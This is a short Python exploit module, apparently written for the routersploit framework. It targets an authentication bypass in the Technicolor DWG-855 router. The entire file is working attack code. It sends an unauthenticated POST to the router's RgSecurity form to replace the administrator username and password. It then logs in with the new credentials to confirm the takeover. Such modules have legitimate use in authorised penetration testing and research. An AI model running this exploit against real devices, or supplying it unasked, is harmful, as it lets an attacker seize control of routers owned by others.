# rsf exploit module
# description: Exploits Technicolor DWG-855 Authentication Bypass vulnerability to change admin credentials.

import requests

def exploit(target, port, nuser, npass):
    url = f"http://{target}:{port}/goform/RgSecurity"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    data = {
        "HttpUserId": nuser,
        "Password": npass,
        "PasswordReEnter": npass,
        "RestoreFactoryNo": "0x00"
    }

    response = requests.post(url, headers=headers, data=data)

    if response.status_code == 401:
        check_url = f"http://{target}:{port}/RgSwInfo.asp"
        check_response = requests.get(check_url, auth=(nuser, npass))
        if check_response.status_code == 200:
            print(f"[+] Credentials changed successfully to {nuser}:{npass}")
        else:
            print("[-] Access denied with new credentials.")
    else:
        print("[-] Exploit failed or unknown response.")

